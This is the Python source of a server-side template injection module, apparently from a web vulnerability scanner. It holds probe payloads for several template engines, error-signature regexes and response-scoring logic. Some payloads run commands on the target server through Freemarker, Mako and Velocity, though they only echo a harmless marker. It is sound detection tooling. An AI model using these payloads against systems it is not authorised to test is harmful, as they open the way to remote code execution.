import re
from injectors.base import BaseInjector
from models.scan_config import VulnerabilityReport


class SSTIInjector(BaseInjector):
    """Server-Side Template Injection testing — Jinja2, Twig, Freemarker, Mako, ERB, Pebble, Velocity, Smarty."""

    name = "ssti"
    description = "Tests for Server-Side Template Injection across common template engines"

    # Unique canary multiplication: 1337 * 7331 = 9799447
    CANARY_PRODUCT = "9799447"

    # Error patterns that reveal a template engine is in use
    ERROR_PATTERNS = [
        # Jinja2 / Flask
        r"jinja2\.exceptions",
        r"UndefinedError",
        r"TemplateSyntaxError",
        r"jinja2",
        # Twig (PHP)
        r"Twig_Error",
        r"Twig\\Error",
        r"twig\.error",
        # Freemarker (Java)
        r"freemarker\.core\.",
        r"freemarker\.template\.",
        r"FreeMarker template error",
        r"ParseException",
        # Mako (Python)
        r"mako\.exceptions",
        r"MakoException",
        # ERB (Ruby)
        r"SyntaxError.*erb",
        r"erb.*error",
        # Velocity (Java)
        r"org\.apache\.velocity",
        r"VelocityException",
        # Pebble (Java)
        r"com\.mitchellbosecke\.pebble",
        r"PebbleException",
        # Smarty (PHP)
        r"Smarty.*error",
        r"SmartyCompilerException",
        # Thymeleaf (Java)
        r"org\.thymeleaf",
        r"TemplateProcessingException",
        # Generic
        r"template.*syntax.*error",
        r"template.*not.*found",
        r"unexpected.*tag",
    ]

    def generate_quick_payloads(self, context: dict) -> list[str]:
        return [
            "{{1337*7331}}",            # Jinja2 / Twig / Pebble
            "${1337*7331}",             # Freemarker / Mako / EL
            "<%= 1337*7331 %>",         # ERB (Ruby)
        ]

    def generate_payloads(self, context: dict) -> list[str]:
        return [
            # ── Canary probes (unique product avoids false positives) ──
            "{{1337*7331}}",                  # Jinja2 / Twig / Pebble
            "${1337*7331}",                   # Freemarker / Mako / EL
            "<%= 1337*7331 %>",               # ERB (Ruby)
            "#{1337*7331}",                   # Ruby string interpolation / Pebble alt
            "{1337*7331}",                    # Smarty (unquoted)
            "${{1337*7331}}",                 # Angular / some edge cases
            "{{=1337*7331}}",                 # Handlebars/Mustache computed

            # ── String multiplication (Jinja2-specific) ──
            "{{'7'*7}}",                      # Jinja2 → "7777777"

            # ── Engine-specific payloads ──
            # Jinja2
            "{{config}}",
            "{{self.__class__.__mro__}}",
            # Twig
            "{{_self.env.display('x')}}",
            # Freemarker
            "<#assign x=1337*7331>${x}",
            "${\"freemarker.template.utility.Execute\"?new()(\"echo EPT_SSTI\")}",
            # Velocity
            "#set($x=1337*7331)$x",
            "#set($e=\"\")$e.class.forName(\"java.lang.Runtime\")",
            # Smarty
            "{math equation=\"1337*7331\"}",
            "{php}echo 'EPT_SSTI';{/php}",
            # Mako
            "${1337*7331}",
            "<%import os%>${os.popen('echo EPT_SSTI').read()}",
            # Pebble
            "{% set x = 1337*7331 %}{{ x }}",

            # ── Error-triggering / detection probes ──
            "{{invalid_var_xyz}}",
            "${invalid_var_xyz}",
            "<%= invalid_var_xyz %>",
            "{{''.__class__}}",
            "${T(java.lang.Runtime)}",

            # ── Filter bypass variants ──
            "{{''|join}}",                    # Jinja2 filter chain
            "{%25 set x=1337*7331 %25}{{x}}", # URL-encoded delimiters
        ]

    def analyze_response(
        self, baseline: dict, test_response: dict, payload: str,
    ) -> VulnerabilityReport:
        evidence: list[str] = []
        is_vulnerable = False
        confidence = "low"

        body = test_response.get("body", "")
        body_lower = body.lower()
        baseline_body = baseline.get("body", "")
        baseline_lower = baseline_body.lower()
        test_status = test_response.get("status_code", 0)
        baseline_status = baseline.get("status_code", 0)
        test_time = test_response.get("response_time_ms", 0)
        baseline_time = baseline.get("response_time_ms", 0)

        # 1. Canary product detection (9799447 from 1337*7331)
        if self.CANARY_PRODUCT in body and self.CANARY_PRODUCT not in baseline_body:
            evidence.append(f"Template expression evaluated: {self.CANARY_PRODUCT} found in response")
            is_vulnerable = True
            confidence = "high"

        # 2. String multiplication (Jinja2: '7'*7 → 7777777)
        if "7777777" in body and "7777777" not in baseline_body:
            evidence.append("Jinja2 string multiplication: '7'*7 → 7777777")
            is_vulnerable = True
            confidence = "high"

        # 3. Command execution marker
        if "EPT_SSTI" in body and "EPT_SSTI" not in baseline_body:
            evidence.append("Command execution via template injection: EPT_SSTI marker found")
            is_vulnerable = True
            confidence = "high"

        # 4. Python/Java object reference leaked
        object_patterns = [
            (r"<class\s+'", "Python class reference leaked"),
            (r"__class__", "Python __class__ attribute accessible"),
            (r"__mro__", "Python MRO chain accessible"),
            (r"java\.lang\.", "Java class reference leaked"),
            (r"<Configuration", "Jinja2/Flask config object leaked"),
        ]
        for pattern, desc in object_patterns:
            if re.search(pattern, body) and not re.search(pattern, baseline_body):
                evidence.append(desc)
                is_vulnerable = True
                confidence = "high"

        # 5. Template engine error patterns
        for pattern in self.ERROR_PATTERNS:
            if re.search(pattern, body_lower, re.IGNORECASE):
                if not re.search(pattern, baseline_lower, re.IGNORECASE):
                    evidence.append(f"Template error pattern: {pattern}")
                    is_vulnerable = True
                    if confidence != "high":
                        confidence = "medium"

        # 6. Server error triggered
        if test_status == 500 and baseline_status != 500:
            evidence.append(f"500 error triggered (baseline was {baseline_status})")
            if not is_vulnerable:
                is_vulnerable = True
                confidence = "low"

        # 7. Suppress false positives: 4xx rejection = input validation working
        is_rejection = 400 <= test_status < 500
        if is_rejection and not evidence:
            pass  # Server properly rejected — no finding

        return VulnerabilityReport(
            is_vulnerable=is_vulnerable,
            confidence=confidence,
            details="; ".join(evidence) if evidence else "No indicators found",
            evidence=evidence,
        )
